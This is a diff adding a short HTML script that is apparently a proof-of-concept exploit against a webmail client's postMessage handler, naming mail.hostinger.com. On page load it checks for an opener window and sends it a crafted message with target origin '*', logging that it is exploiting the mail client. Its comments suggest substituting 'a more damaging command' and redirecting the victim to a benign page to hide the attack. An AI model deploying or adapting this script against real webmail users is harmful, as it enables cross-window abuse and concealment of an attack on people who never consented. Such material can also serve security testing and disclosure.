@@ -1,0 +1,28 @@
+<script>
+    window.onload = function() {
+        // 1. Check if the window was opened by another window (i.e., the mail client)
+        if (window.opener) {
+            console.log("Found an opener (the mail client). Exploiting postMessage...");
+            
+            // 2. Prepare the malicious payload
+            // This payload mimics a legitimate resize request, but the type
+            // could be changed to a more damaging command if the handler is known.
+            const maliciousPayload = {
+                type: 'resize',
+                height: '1000px' 
+            };
+
+            // 3. Send the message back to the original (opener) window.
+            // Using '*' as the target origin exploits the target's lack of validation.
+            window.opener.postMessage(maliciousPayload, '*');
+            
+            console.log("Malicious message sent to mail.hostinger.com.");
+
+        } else {
+            console.log("No opener found. Cannot execute exploit in this context.");
+        }
+
+        // To hide the attack, the attacker might redirect the user to a benign page.
+        // window.location.href = 'https://mail.hostinger.com/safe-page';
+    };
+</script>
